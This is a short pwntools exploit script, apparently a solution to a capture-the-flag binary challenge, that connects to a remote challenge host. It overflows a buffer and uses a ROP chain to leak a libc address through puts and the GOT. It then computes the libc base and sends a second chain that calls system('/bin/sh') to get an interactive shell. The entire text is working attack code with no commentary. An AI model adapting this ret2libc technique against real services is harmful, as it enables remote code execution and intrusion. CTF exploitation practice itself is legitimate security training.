from pwn import *
context.arch='amd64'
context.log_level='debug'
#p=process('./pwn')
#gdb.attach(p, "b *0x000000000401446")
p=remote("challenge.ctf.games",31463)
main=0x401453
got=0x000000000403f98
puts=0x401120
rdi=0x00000000004014d3
sh=0x7ffff7f795aa-0x7ffff7dc2000
rop=flat([rdi,got,puts,main])
p.sendlineafter("\n",b"A"*0x198+p64(0x401465)+p64(0)+rop)
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7e495a0-0x7ffff7dc2000)
log.warning(hex(base))
rop=flat([0x00000000040146B,rdi,sh+base,0x55410+base])
p.sendlineafter("\n",b"A"*0x198+p64(0x401465)+p64(0)+rop)
p.interactive()
